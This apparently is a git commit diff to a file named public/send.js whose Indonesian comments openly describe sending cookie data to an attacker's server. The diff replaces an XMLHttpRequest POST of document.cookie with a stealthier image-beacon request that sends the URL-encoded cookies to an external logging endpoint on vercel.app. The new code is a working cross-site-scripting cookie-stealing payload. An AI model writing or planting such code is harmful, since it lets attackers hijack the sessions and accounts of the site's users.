aae76ac70edac18ea9b0445c4edb1b7834a028ce
Glaezz <fiezarausyan@gmail.com>
2025-08-06 19:12:56 +0700

    fix script js

--- public/send.js
+++ public/send.js
@@ -1,11 +1,3 @@
-// Kirim data cookie ke server penyerang
 var stolenCookies = document.cookie;
-
-// URL server penyerang
-var attackerURL = 'https://xss-logger.vercel.app/logger';
-
-// Kirim data ke URL penyerang
-var xhr = new XMLHttpRequest();
-xhr.open("POST", attackerURL, true);
-xhr.setRequestHeader("Content-type", "application/json");
-xhr.send(JSON.stringify({ "cookies": stolenCookies }));
+var img = new Image();
+img.src = "https://xss-logger.vercel.app/logger?cookies=" + encodeURIComponent(stolenCookies);
